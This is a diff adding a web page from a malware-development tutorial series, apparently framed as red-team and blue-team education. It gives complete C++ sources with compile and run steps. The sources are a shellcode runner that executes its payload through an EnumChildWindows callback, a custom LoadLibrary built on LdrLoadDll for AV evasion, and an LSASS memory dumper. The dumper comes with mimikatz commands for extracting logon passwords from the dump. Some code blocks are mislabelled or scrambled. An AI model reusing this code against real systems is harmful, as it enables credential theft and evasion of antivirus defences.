+// if this process created the mutex, exit the application
+if (hMutex &amp;&amp; GetLastError() == ERROR_ALREADY_EXISTS) {
+
+CloseHandle(hMutex);
+return 0;
+}
+}
+otherwise, run malicious logic and close the mutex when done:
+//...
+// malicious logic
+LPVOID mem = VirtualAlloc(NULL, sizeof(my_payload), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+RtlMoveMemory(mem, my_payload, sizeof(my_payload));
+EnumChildWindows(NULL, (WNDENUMPROC)mem, NULL);
+//...
+// cleanup
+if (hMutex)
+CloseHandle(hMutex);
+return 0;
+So, full source code is looks like:
+/*
+* hack.cpp - Create mutex, run shellcode. C++ implementation
+* @cocomelonc
+* https://cocomelonc.github.io/malware/2023/01/04/malware-tricks-26.html
+*/
+#include &lt;windows.h&gt;
+unsigned char my_payload[] =
+// 64-bit meow-meow messagebox
+"\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
+"\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
+"\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72"
+"\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac"
+"\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2"
+"\xed\x52\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48"
+"\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6f"
+"\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44\x8b\x40\x20\x49"
+"\x01\xd0\xe3\x5c\x48\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01"
+"\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01"
+"\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1"
+"\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41"
+"\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b"
+"\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58"
+"\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
+"\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7"
+
+"\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\x1a\x01\x00\x00\x3e"
+"\x4c\x8d\x85\x25\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83"
+"\x56\x07\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
+"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
+"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
+"\xd5\x4d\x65\x6f\x77\x2d\x6d\x65\x6f\x77\x21\x00\x3d\x5e"
+"\x2e\x2e\x5e\x3d\x00";
+int main(int argc, char* argv[]) {
+HANDLE hMutex;
+// create mutex with a name so multiple instances can detect it
+hMutex = CreateMutexA(NULL, FALSE, "MeowMeowMutex");
+// check if the mutex already exists
+if (GetLastError() == ERROR_ALREADY_EXISTS) {
+// if this process created the mutex, exit the application
+if (hMutex &amp;&amp; GetLastError() == ERROR_ALREADY_EXISTS) {
+CloseHandle(hMutex);
+return 0;
+}
+}
+// shellcode running logic
+LPVOID mem = VirtualAlloc(NULL, sizeof(my_payload), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+RtlMoveMemory(mem, my_payload, sizeof(my_payload));
+EnumChildWindows(NULL, (WNDENUMPROC)mem, NULL);
+// cleanup
+if (hMutex)
+CloseHandle(hMutex);
+return 0;
+}
+As you can see, I use running shellcode via EnumChildWindows logic. Also, as usually,
+use meow-meow messagebox payload.
+demo</code></pre>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Let’s go to see everything in action. Compile our “malware”: x86_64-w64-mingw32-g++ -O2 hack.cpp -o hack.exe \ -I/usr/share/mingw-w64/include/ -s \ -ffunction-sections -fdata-sections -Wno-write-strings \ -fno-exceptions -fmerge-all-constants -static-libstdc++ \ -static-libgcc -fpermissive</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Then, move to victim’s machine (in my case Windows 10 x64) and run: .\hack.exe</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Then, try to run this “malware” again from another Powershell terminal:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">As you can see, nothing started, we only have one messagebox. For checking correctness, we can add some print to our code:</p>
+
+            <div class="my-6 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs">
+                <div class="flex items-center justify-between px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                    <div class="flex items-center gap-2 text-[var(--accent)] font-semibold text-xs tracking-wider uppercase">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5"></i>
+                        <span>C / C++ Source</span>
+                    </div>
+                    <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-3 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition">
+                        <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                        <span>Copy</span>
+                    </button>
+                </div>
+                <pre class="p-4 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono"><code class="language-c">/*
+* hack.cpp - Create mutex, run shellcode. C++ implementation
+* @cocomelonc
+* https://cocomelonc.github.io/
+*/
+#include &lt;windows.h&gt;
+#include &lt;cstdio&gt;
+unsigned char my_payload[] =
+// 64-bit meow-meow messagebox
+"\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
+"\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
+"\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72"
+"\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac"
+"\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2"
+"\xed\x52\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48"
+"\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6f"
+"\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44\x8b\x40\x20\x49"
+"\x01\xd0\xe3\x5c\x48\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01"
+"\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01"
+"\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1"
+"\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41"
+
+"\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b"
+"\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58"
+"\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
+"\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7"
+"\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\x1a\x01\x00\x00\x3e"
+"\x4c\x8d\x85\x25\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83"
+"\x56\x07\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
+"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
+"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
+"\xd5\x4d\x65\x6f\x77\x2d\x6d\x65\x6f\x77\x21\x00\x3d\x5e"
+"\x2e\x2e\x5e\x3d\x00";
+int main(int argc, char* argv[]) {
+HANDLE hMutex;
+// create mutex with a name so multiple instances can detect it
+hMutex = CreateMutexA(NULL, FALSE, "MeowMeowMutex");
+// check if the mutex already exists
+if (GetLastError() == ERROR_ALREADY_EXISTS) {
+// if this process created the mutex, exit the application
+if (hMutex &amp;&amp; GetLastError() == ERROR_ALREADY_EXISTS) {
+printf("MeowMeowMutex already exists, app already running =^..^=\n");
+CloseHandle(hMutex);
+return 0;
+}
+}
+// shellcode running logic
+LPVOID mem = VirtualAlloc(NULL, sizeof(my_payload), MEM_COMMIT,
+PAGE_EXECUTE_READWRITE);
+RtlMoveMemory(mem, my_payload, sizeof(my_payload));
+EnumChildWindows(NULL, (WNDENUMPROC)mem, NULL);
+// cleanup
+if (hMutex)
+CloseHandle(hMutex);
+return 0;
+}
+Then, repeat our steps again:
+
+As you can see everything is worked perfectly!</code></pre>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Let’s go to upload hack.exe to VirusTotal:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">So, 17 of 62 AV engines detect our file as malicious. https://www.virustotal.com/gui/file/153d249063f46b0d56603d7aab7e43a3361d74 e9852367d8730f5e57fb9f5b9f/details This is trick is used for example by Conti ransomware, Hellokitty ransomware and AsyncRAT in the wild. I hope this post spreads awareness to the blue teamers of this interesting technique, and adds a weapon to the red teamers arsenal. Conti Hellokitty Hellokitty source code AsyncRAT source code source code in github</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">40. malware development trick. WinAPI <code class="px-1.5 py-0.5 rounded bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold">LoadLibrary</code> implementation. Simple C++ example.</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Today, I just want to focus my research on another malware development trick: it’s also helpful to AV evasion in some cases and scenarios. Like previous posts with <code class="px-1.5 py-0.5 rounded bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold">GetModuleHandle</code> and <code class="px-1.5 py-0.5 rounded bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold">GetProcAddress</code> implementations, what about my own <code class="px-1.5 py-0.5 rounded bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold">LoadLibrary</code> implementation? Let’s try to do it. <code class="px-1.5 py-0.5 rounded bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold">LoadLibrary</code> <code class="px-1.5 py-0.5 rounded bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold">LoadLibrary</code> is a Windows API function that allows you to load a dynamic-link library (DLL) module into the address space of the calling process. The function takes the name of the DLL as an argument and returns a handle to the loaded module. If the function fails, it returns NULL: HMODULE <code class="px-1.5 py-0.5 rounded bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold">LoadLibraryA</code>( LPCSTR lpLibFileName ); lpFileName - A null-terminated string that specifies the name of the module (either a .dll or .exe file).</p>
+
+            <div id="practical-example" class="scroll-mt-24 pt-6 pb-2 border-b border-[#212b54] mt-8 mb-4">
+                <h3 class="text-base sm:text-lg font-bold text-white flex items-center gap-2">
+                    <i data-lucide="sparkles" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i>
+                    <span>Practical example</span>
+                </h3>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">First of all, create our own DLL. For example something like this (pet.c):</p>
+
+            <div class="my-6 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs">
+                <div class="flex items-center justify-between px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                    <div class="flex items-center gap-2 text-[var(--accent)] font-semibold text-xs tracking-wider uppercase">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5"></i>
+                        <span>Python 3</span>
+                    </div>
+                    <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-3 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition">
+                        <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                        <span>Copy</span>
+                    </button>
+                </div>
+                <pre class="p-4 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono"><code class="language-python">/*
+pet.dll - DLL example for LoadLibrary
+*/
+#include &lt;windows.h&gt;
+
+#pragma comment (lib, "user32.lib")
+BOOL APIENTRY DllMain(HMODULE hModule,
+switch (ul_reason_for_call) {
+case DLL_PROCESS_ATTACH:
+break;
+case DLL_PROCESS_DETACH:
+break;
+case DLL_THREAD_ATTACH:
+break;
+case DLL_THREAD_DETACH:
+break;
+}
+return TRUE;
+}
+
+DWORD
+
+ul_reason_for_call, LPVOID lpReserved) {
+
+__declspec(dllexport) int _cdecl Cat() {
+MessageBox(NULL, "meow-meow", "=^..^=", MB_OK);
+return 1;
+}
+__declspec(dllexport) int _cdecl Mouse() {
+MessageBox(NULL, "squeak-squeak", "&lt;:3()~", MB_OK);
+return 1;
+}
+Then, create our application which load this DLL. Simple implementation of
+LoadLibrary logic is looks like this:
+/*
+* hack.c - LoadLibrary implementation. C++ implementation
+* @cocomelonc
+* https://cocomelonc.github.io/tutorial/2023/04/27/malware-tricks-27.html
+*/
+#include &lt;stdlib.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;windows.h&gt;
+#include &lt;winternl.h&gt;
+typedef int (__cdecl *CatProc)();
+typedef int (__cdecl *MouseProc)();
+typedef NTSTATUS(NTAPI *pLdrLoadDll) (
+PWCHAR PathToFile,
+ULONG Flags,
+PUNICODE_STRING ModuleFileName,
+PHANDLE ModuleHandle
+
+);
+typedef VOID (NTAPI *pRtlInitUnicodeString)(PUNICODE_STRING DestinationString,
+PCWSTR SourceString);
+HMODULE MyLoadLibrary(LPCWSTR lpFileName) {
+UNICODE_STRING ustrModule;
+HANDLE hModule = NULL;
+HMODULE hNtdll = GetModuleHandle("ntdll.dll");
+pRtlInitUnicodeString RtlInitUnicodeString =
+(pRtlInitUnicodeString)GetProcAddress(hNtdll, "RtlInitUnicodeString");
+RtlInitUnicodeString(&amp;ustrModule, lpFileName);
+pLdrLoadDll myLdrLoadDll = (pLdrLoadDll)
+GetProcAddress(GetModuleHandle("ntdll.dll"), "LdrLoadDll");
+if (!myLdrLoadDll) {
+return NULL;
+}
+NTSTATUS status = myLdrLoadDll(NULL, 0, &amp;ustrModule, &amp;hModule);
+return (HMODULE)hModule;
+}
+int main() {
+HMODULE petDll = MyLoadLibrary(L"pet.dll");
+if (petDll) {
+CatProc catFunc = (CatProc) GetProcAddress(petDll, "Cat");
+MouseProc mouseFunc = (MouseProc) GetProcAddress(petDll, "Mouse");
+if ((catFunc != NULL) &amp;&amp; (mouseFunc != NULL)) {
+(catFunc) ();
+(mouseFunc) ();
+}
+FreeLibrary(petDll);
+} else {
+printf("failed to load library :(\n");
+}
+return 0;
+}</code></pre>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">This implementation utilizes the undocumented LdrLoadDll function: NTSYSAPI NTSTATUS NTAPI LdrLoadDll(</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">IN PWCHAR IN ULONG IN PUNICODE_STRING OUT PHANDLE</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">PathToFile OPTIONAL, Flags OPTIONAL, ModuleFileName, ModuleHandle );</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">which is part of the ntdll.dll library. Using the LdrLoadDll function, we can manually load a library by providing the necessary parameters. Ok, can we use our DLL in other applications by loading it with MyLoadLibrary? Yes, we can. Also, as you can see, we can getting the function addresses using <code class="px-1.5 py-0.5 rounded bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold">GetProcAddress</code>. Also, we use the RtlInitUnicodeString function pointer instead of the direct function call.</p>
+
+            <div id="demo" class="scroll-mt-24 pt-6 pb-2 border-b border-[#212b54] mt-8 mb-4">
+                <h3 class="text-base sm:text-lg font-bold text-white flex items-center gap-2">
+                    <i data-lucide="sparkles" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i>
+                    <span>Demo</span>
+                </h3>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Ok, let’s go to see everything in practice. First of all compile our pet.c:</p>
+
+            <div class="my-4 rounded-xl overflow-hidden border border-[#212b54] bg-[#070a15] font-mono text-xs shadow-md">
+                <div class="px-3.5 py-1.5 bg-[#0d132b] text-[10px] text-[#cbd5e1] font-bold uppercase flex items-center gap-1.5 border-b border-[#1c243f]">
+                    <i data-lucide="terminal" class="w-3.5 h-3.5 text-[var(--accent)]"></i>
+                    <span>Terminal / Compilation Command</span>
+                </div>
+                <pre class="p-3.5 text-[#9ff0d0] overflow-x-auto leading-relaxed"><code class="language-bash">x86_64-w64-mingw32-gcc -shared -o pet.dll pet.c</code></pre>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Then, compile our “malware” application (hack.cpp): x86_64-w64-mingw32-g++ -O2 hack.cpp -o hack.exe \ -I/usr/share/mingw-w64/include/ -s \ -ffunction-sections -fdata-sections -Wno-write-strings \ -fno-exceptions -fmerge-all-constants -static-libstdc++ \ -static-libgcc -fpermissive</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Finally, run it at the victim’s machine (Windows 10 x64): .\hack.exe</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">As you can see, everything is worked perfectly! =.. = I hope this post spreads awareness to the blue teamers of this interesting malware dev technique, and adds a weapon to the red teamers arsenal. <code class="px-1.5 py-0.5 rounded bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold">LoadLibrary</code> <code class="px-1.5 py-0.5 rounded bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold">GetProcAddress</code> <code class="px-1.5 py-0.5 rounded bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold">GetModuleHandle</code> RtlInitUnicodeString source code in github</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">41. malware development trick. Dump lsass.exe. Simple C++ example.</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Today, I want to show how we can dumping Lsass without Mimikatz: via MiniDumpWriteDump API. Since mimikatz is a very famous tool and easy to detect, hackers find new tricks to reimplement some features from it’s logic.</p>
+
+            <div id="practical-example" class="scroll-mt-24 pt-6 pb-2 border-b border-[#212b54] mt-8 mb-4">
+                <h3 class="text-base sm:text-lg font-bold text-white flex items-center gap-2">
+                    <i data-lucide="sparkles" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i>
+                    <span>Practical example</span>
+                </h3>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">So, how we can write a simple lsass.exe process dumper? We use MiniDumpWriteDump: BOOL MiniDumpWriteDump( [in] HANDLE hProcess, [in] DWORD ProcessId, [in] HANDLE hFile, [in] MINIDUMP_TYPE DumpType, [in] PMINIDUMP_EXCEPTION_INFORMATION ExceptionParam, [in] PMINIDUMP_USER_STREAM_INFORMATION UserStreamParam, [in] PMINIDUMP_CALLBACK_INFORMATION CallbackParam ); The MiniDumpWriteDump function is a Windows API function that creates a minidump file, which is a small snapshot of the application state at the time the function is called. This file can be useful for debugging purposes, as it contains the exception information, a list of loaded DLLs, stack information, and other system state information. First of all, we find lsass.exe process, via function like this: int findMyProc(const char *procname) {</p>
+
+            <div class="my-6 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs">
+                <div class="flex items-center justify-between px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                    <div class="flex items-center gap-2 text-[var(--accent)] font-semibold text-xs tracking-wider uppercase">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5"></i>
+                        <span>C / C++ Source</span>
+                    </div>
+                    <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-3 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition">
+                        <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                        <span>Copy</span>
+                    </button>
+                </div>
+                <pre class="p-4 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono"><code class="language-c">HANDLE hSnapshot;
+PROCESSENTRY32 pe;
+
+int pid = 0;
+BOOL hResult;
+// snapshot of all processes in the system
+hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+if (INVALID_HANDLE_VALUE == hSnapshot) return 0;
+// initializing size: needed for using Process32First
+pe.dwSize = sizeof(PROCESSENTRY32);
+// info about first process encountered in a system snapshot
+hResult = Process32First(hSnapshot, &amp;pe);
+// retrieve information about the processes
+// and exit if unsuccessful
+while (hResult) {
+// if we find the process: return process ID
+if (strcmp(procname, pe.szExeFile) == 0) {
+pid = pe.th32ProcessID;
+break;
+}
+hResult = Process32Next(hSnapshot, &amp;pe);
+}
+// closes an open handle (CreateToolhelp32Snapshot)
+CloseHandle(hSnapshot);
+return pid;
+}
+It is necessary to have SeDebugPrivilege privilege to dump LSASS as an attacker:
+// set privilege
+BOOL setPrivilege(LPCTSTR priv) {
+HANDLE token;
+TOKEN_PRIVILEGES tp;
+LUID luid;
+BOOL res = TRUE;
+if (!LookupPrivilegeValue(NULL, priv, &amp;luid)) res = FALSE;
+tp.PrivilegeCount = 1;
+tp.Privileges[0].Luid = luid;
+tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES,
+&amp;token)) res = FALSE;
+if (!AdjustTokenPrivileges(token, FALSE, &amp;tp, sizeof(TOKEN_PRIVILEGES),
+
+(PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL)) res = FALSE;
+printf(res ? "successfully enable %s :)\n" : "failed to enable %s :(\n", priv);
+return res;
+}
+Then, create dump:
+// minidump lsass.exe
+BOOL createMiniDump() {
+bool dumped = FALSE;
+int pid = findMyProc("lsass.exe");
+HANDLE ph = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, 0, pid);
+HANDLE out = CreateFile((LPCTSTR)"c:\\temp\\lsass.dmp", GENERIC_ALL, 0,
+NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+if (ph &amp;&amp; out != INVALID_HANDLE_VALUE) {
+dumped = MiniDumpWriteDump(ph, pid, out, (MINIDUMP_TYPE)0x00000002, NULL,
+NULL, NULL);
+printf(dumped ? "successfully dumped to lsaas.dmp :)\n" :
+"failed to dump :(\n");
+}
+return dumped;
+}</code></pre>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">So, the full source code is looks like this hack.cpp:</p>
+
+            <div class="my-6 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs">
+                <div class="flex items-center justify-between px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                    <div class="flex items-center gap-2 text-[var(--accent)] font-semibold text-xs tracking-wider uppercase">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5"></i>
+                        <span>C / C++ Source</span>
+                    </div>
+                    <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-3 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition">
+                        <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                        <span>Copy</span>
+                    </button>
+                </div>
+                <pre class="p-4 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono"><code class="language-c">/*
+* hack.cpp - Dump lsass without mimikatz. C++ implementation
+* @cocomelonc
+* https://cocomelonc.github.io/tutorial/2023/05/11/malware-tricks-28.html
+*/
+#include &lt;windows.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;tlhelp32.h&gt;
+#include &lt;dbghelp.h&gt;
+#pragma comment (lib, "dbghelp.lib")
+int findMyProc(const char *procname) {
+HANDLE hSnapshot;
+PROCESSENTRY32 pe;
+int pid = 0;
+BOOL hResult;
+// snapshot of all processes in the system
+hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+if (INVALID_HANDLE_VALUE == hSnapshot) return 0;
+
+// initializing size: needed for using Process32First
+pe.dwSize = sizeof(PROCESSENTRY32);
+// info about first process encountered in a system snapshot
+hResult = Process32First(hSnapshot, &amp;pe);
+// retrieve information about the processes
+// and exit if unsuccessful
+while (hResult) {
+// if we find the process: return process ID
+if (strcmp(procname, pe.szExeFile) == 0) {
+pid = pe.th32ProcessID;
+break;
+}
+hResult = Process32Next(hSnapshot, &amp;pe);
+}
+// closes an open handle (CreateToolhelp32Snapshot)
+CloseHandle(hSnapshot);
+return pid;
+}
+// set privilege
+BOOL setPrivilege(LPCTSTR priv) {
+HANDLE token;
+TOKEN_PRIVILEGES tp;
+LUID luid;
+BOOL res = TRUE;
+if (!LookupPrivilegeValue(NULL, priv, &amp;luid)) res = FALSE;
+tp.PrivilegeCount = 1;
+tp.Privileges[0].Luid = luid;
+tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES,
+&amp;token)) res = FALSE;
+if (!AdjustTokenPrivileges(token, FALSE, &amp;tp, sizeof(TOKEN_PRIVILEGES),
+(PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL)) res = FALSE;
+printf(res ? "successfully enable %s :)\n" : "failed to enable %s :(\n", priv);
+return res;
+}
+// minidump lsass.exe
+BOOL createMiniDump() {
+
+bool dumped = FALSE;
+int pid = findMyProc("lsass.exe");
+HANDLE ph = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, 0, pid);
+HANDLE out = CreateFile((LPCTSTR)"c:\\temp\\lsass.dmp", GENERIC_ALL, 0,
+NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+if (ph &amp;&amp; out != INVALID_HANDLE_VALUE) {
+dumped = MiniDumpWriteDump(ph, pid, out, (MINIDUMP_TYPE)0x00000002, NULL,
+NULL, NULL);
+printf(dumped ? "successfully dumped to lsaas.dmp :)\n" : "failed to dump :(\n");
+}
+return dumped;
+}
+int main(int argc, char* argv[]) {
+if (!setPrivilege(SE_DEBUG_NAME)) return -1;
+if (!createMiniDump()) return -1;
+return 0;
+}</code></pre>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">As you can see, do not forget to add dbghelp.lib as a dependency: #pragma comment (lib, "dbghelp.lib")</p>
+
+            <div id="demo" class="scroll-mt-24 pt-6 pb-2 border-b border-[#212b54] mt-8 mb-4">
+                <h3 class="text-base sm:text-lg font-bold text-white flex items-center gap-2">
+                    <i data-lucide="sparkles" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i>
+                    <span>Demo</span>
+                </h3>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Let’s go to see everything in action. Compile our dumper at the attacker’s machine (kali x64): x86_64-w64-mingw32-g++ -O2 hack.cpp -o hack.exe \ -I/usr/share/mingw-w64/include/ -s \ -ffunction-sections -fdata-sections -Wno-write-strings \ -fno-exceptions -fmerge-all-constants -static-libstdc++ \ -static-libgcc -fpermissive -ldbghelp</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Then, execute it at the victim’s machine (windows 10 x64 in my case): .\hack.exe</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">As you can see, lsass.dmp gets dumped to the working directory: C:\\temp\. Then, open mimikatz load in the dump file and dump passwords: .\mimikatz.exe sekurlsa::minidump c:\temp\lsass.dmp sekurlsa::logonpasswords</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">341</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Interesting moment: not work in mimikatz v2.2.0 on my Windows:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Note that Windows Defender on Windows 10 is flagging up mimikatz immediately… but allows running hack.exe. So, what’s the trick? We can create an attack in this following path:</p>
